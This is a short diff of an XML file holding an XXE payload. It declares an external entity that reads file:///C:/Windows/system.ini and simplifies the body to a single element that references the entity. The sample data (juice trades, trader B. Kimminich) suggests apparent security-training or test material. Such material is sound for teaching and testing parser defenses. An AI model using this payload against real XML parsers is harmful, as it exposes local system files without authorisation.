@@ -3,20 +3,4 @@
 <!DOCTYPE foo [<!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]>
 
-<trades>
-    <metadata>
-        <name>Apple Juice</name>
-        <trader>
-            <foo>&xxe;</foo>
-            <name>B. Kimminich</name>
-        </trader>
-        <units>1500</units>
-        <price>106</price>
-        <name>Lemon Juice</name>
-        <trader>
-            <name>B. Kimminich</name>
-        </trader>
-        <units>4500</units>
-        <price>195</price>
-    </metadata>
-</trades>
+<foo>&xxe;</foo>
